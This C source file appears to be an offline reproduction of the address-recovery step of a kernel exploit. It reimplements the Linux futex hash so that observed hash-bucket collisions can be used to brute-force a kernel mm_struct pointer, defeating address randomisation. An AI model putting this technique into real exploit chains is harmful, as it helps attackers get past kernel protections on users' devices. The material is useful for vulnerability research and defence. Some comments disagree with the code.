/* Offline replica of the exploit's KernelSnitch mm scan.
 * Uses the collision addresses observed in the on-device log to check
 * whether hash equality can EVER hold across candidates, and how often
 * random false positives occur over the 12 GB / 0x400 grid.
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

static uint32_t rol32(uint32_t w, unsigned s) {
    s &= 31;
    return s ? (w << s) | (w >> (32 - s)) : w;
}

#define __jhash_mix(a, b, c)                \
    {                                       \
        a -= c; a ^= rol32(c, 4); c += b;   \
        b -= a; b ^= rol32(a, 6); a += c;   \
        c -= b; c ^= rol32(b, 8); b += a;   \
        a -= c; a ^= rol32(c, 16); c += b;  \
        b -= a; b ^= rol32(a, 19); a += c;  \
        c -= b; c ^= rol32(b, 4); b += a;   \
    }

#define __jhash_final(a, b, c)                  \
    {                                          \
        c ^= b; c -= rol32(b, 14);              \
        a ^= c; a -= rol32(c, 11);              \
        b ^= a; b -= rol32(a, 25);              \
        c ^= b; c -= rol32(b, 16);              \
        a ^= c; a -= rol32(c, 4);               \
        b ^= a; b -= rol32(a, 14);              \
        c ^= b; c -= rol32(b, 24);              \
    }

static uint32_t jhash2(const uint32_t *k, uint32_t length, uint32_t initval) {
    uint32_t a, b, c;
    a = b = c = 0xdeadbeef + (length << 2) + initval;
    while (length > 3) {
        a += k[0]; b += k[1]; c += k[2];
        __jhash_mix(a, b, c);
        length -= 3; k += 3;
    }
    switch (length) {
    case 3: c += k[2]; /* fallthrough */
    case 2: b += k[1]; /* fallthrough */
    case 1:
        a += k[0];
        __jhash_final(a, b, c);
        break;
    case 0:
        break;
    }
    return c;
}

/* mirror of futex_hash.h: private key {mm, addr&~0xfff, addr&0xfff},
 * jhash2 over the first 4 words (offsetof(both.offset)=16), initval=offset */
static uint32_t futex_hash(uint64_t addr, uint64_t mm, uint32_t hashsize) {
    uint32_t k[4];
    k[0] = (uint32_t)mm;
    k[1] = (uint32_t)(mm >> 32);
    k[2] = (uint32_t)((addr & ~0xfffULL) & 0xffffffff);
    k[3] = (uint32_t)((addr & ~0xfffULL) >> 32);
    uint32_t off = (uint32_t)(addr & 0xfff);
    return jhash2(k, 4, off) & (hashsize - 1);
}

int main(int argc, char **argv) {
    /* observed on-device collision sets, argv[1] = pile target.
     * usage: ks_repro addr0 addr1 ... addrN stride [hashsize]
     *    or: ks_repro salt naddr addr0..addrN [hashsize] — full 2^32 K0 scan */
    uint64_t a[24] = {0};
    const uint32_t HS = 2048;
    if (argc > 1 && strcmp(argv[1], "salt") == 0) {
        int n = (int)strtoul(argv[2], 0, 10);
        if (argc < n + 3 || n < 4 || n > 24) { fprintf(stderr, "salt: bad args\n"); return 2; }
        for (int i = 0; i < n; i++) a[i] = strtoull(argv[3 + i], 0, 16);
        uint64_t hits = 0;
        for (uint64_t k1 = 0xffffff80ULL; k1 <= 0xffffff83ULL; k1++) {
            for (uint32_t k0 = 0; ; k0++) {
                uint64_t mm = (k1 << 32) | k0;
                uint32_t h0 = futex_hash(a[0], mm, HS);
                int ok = h0 == futex_hash(a[1], mm, HS) &&
                         h0 == futex_hash(a[2], mm, HS);
                for (int i = 3; ok && i < n; i++)
                    ok = (h0 == futex_hash(a[i], mm, HS));
                if (ok) {
                    hits++;
                    printf("HIT mm=%016llx\n", (unsigned long long)mm);
                }
                if (k0 == 0xffffffff) break;
            }
        }
        printf("salt scan done hits=%llu\n", (unsigned long long)hits);
        return 0;
    }
    int naddr = (int)strtoul(argv[1], 0, 10);
    if (argc < naddr + 3 || naddr < 4 || naddr > 24) {
        fprintf(stderr, "usage: %s naddr addr0..addrN stride [hashsize]\n", argv[0]);
        return 2;
    }
    for (int i = 0; i < naddr; i++) a[i] = strtoull(argv[2 + i], 0, 16);
    const uint64_t BASE = 0xffffff8000000000ULL;
    const uint64_t WINDOW = 0x340000000ULL;  /* 13 GB, matches device run */
    const uint64_t STEP = strtoull(argv[naddr + 2], 0, 0);
    const uint32_t HS_SCAN = argc > naddr + 3 ? (uint32_t)strtoul(argv[naddr + 3], 0, 0) : 2048;
    uint64_t hits = 0;
    for (uint64_t phys = 0; phys < WINDOW; phys += STEP) {
        uint64_t mm = BASE + phys;
        uint32_t h0 = futex_hash(a[0], mm, HS_SCAN);
        int ok = 1;
        for (int i = 1; i < naddr && ok; i++)
            ok = (h0 == futex_hash(a[i], mm, HS_SCAN));
        if (!ok) continue;
        hits++;
        printf("HIT  mm=%016llx phys=%llx\n", (unsigned long long)mm,
               (unsigned long long)phys);
    }
    printf("total hits=%llu over %llu candidates stride=%llu naddr=%d\n",
           (unsigned long long)hits, (unsigned long long)(WINDOW / STEP),
           (unsigned long long)STEP, naddr);
    return 0;
}
